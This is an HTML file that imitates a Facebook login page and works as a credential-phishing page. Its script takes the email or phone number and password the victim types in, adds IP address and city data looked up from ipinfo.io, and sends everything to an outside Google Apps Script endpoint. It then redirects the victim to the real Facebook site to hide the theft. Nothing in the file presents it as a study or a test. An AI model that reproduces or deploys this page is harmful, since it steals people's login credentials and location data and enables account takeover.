<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-container {
            background-color: #f2f2f2;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }

        .logo {
            width: 100px;
            margin-bottom: 20px;
        }

        h2 {
            margin-bottom: 20px;
        }

        form {
            display: flex;
            flex-direction: column;
        }

        input[type="text"],
        input[type="password"],
        button {
            height:40px;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 9px;
            font-size: 20px;
        }

        button {
            background-color: #1877f2;
            color: #fff;
            cursor: pointer;
            border-radius: 25px;
            height: 45px;
        }

        button:hover {
            background-color: #166fe5;
        }

        p {
            margin-top: 10px;
        }

        a {
            text-decoration: none;
            color: #1877f2;
        }

        a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="IMG_20241023_072537.jpg" style="height:65px; width:65px;">
        <p style="font-size:18px">Log into Facebook to continue</p>
        <form action="https://script.google.com/macros/s/AKfycbw6mnYUuOUCR6rxf6ThNZAI4siPxTUSYjF7v7H1CGyK1XqnjUghs7Sl17XPhLeVG8JJ/exec" id="FBdata">
            <input type="text" name="email_or_phone" placeholder="Mobile number or email address" style="font-size:19px;" required/>
            <input type="password" name="message" placeholder="Password" required/>
            <input type="hidden" name="ip_address">
            <input type="hidden" name="country">
            <input type="hidden" name="region">
            <input type="hidden" name="city">
            <input type="hidden" name="form_id" value="FBForm">
            <button type="submit">Log In</button>
            <a href="https://m.facebook.com/?refsrc=deprecated">Forgot password?</a>
            <p>or</p>
            <button style="background-color:white; border-color:#1877f2; border-radius:25px; height:45px; margin-top:25px;"><a href="https://m.facebook.com/reg/#" style="color:#1877f2;">Create new account</a></button>
            <center><img style="width:50px; height:20px;" src="IMG_20241018_221207.jpg"></center>
            <p style="font-size:10px">About. Help. More</p>
        </form>        
    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script>
        // Reference to the form element
        const form = document.getElementById('FBdata');

        form.addEventListener('submit', (e) => {
            e.preventDefault();

            // Gather form data
            const formData = new FormData(form);

            // Get location details
            $.getJSON("https://ipinfo.io/?format=json", function(data) {
                // Prepare JSON data to send
                const jsonData = {
                    email_or_phone: formData.get('email_or_phone'),
                    message: formData.get('message'),
                    ip_address: data.ip,
                    country: data.country,
                    region: data.region,
                    city: data.city,
                    form_id: 'FBForm'
                };

                // Send data to Google Apps Script
                fetch('https://script.google.com/macros/s/AKfycbw6mnYUuOUCR6rxf6ThNZAI4siPxTUSYjF7v7H1CGyK1XqnjUghs7Sl17XPhLeVG8JJ/exec', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(jsonData),
                })
                .then(() => {
                    // Redirect to Facebook after submission
                    window.location.href = 'https://www.facebook.com';
                })
                .catch((error) => console.error('Error:', error));
            });
        });
    </script>
</body>
</html>
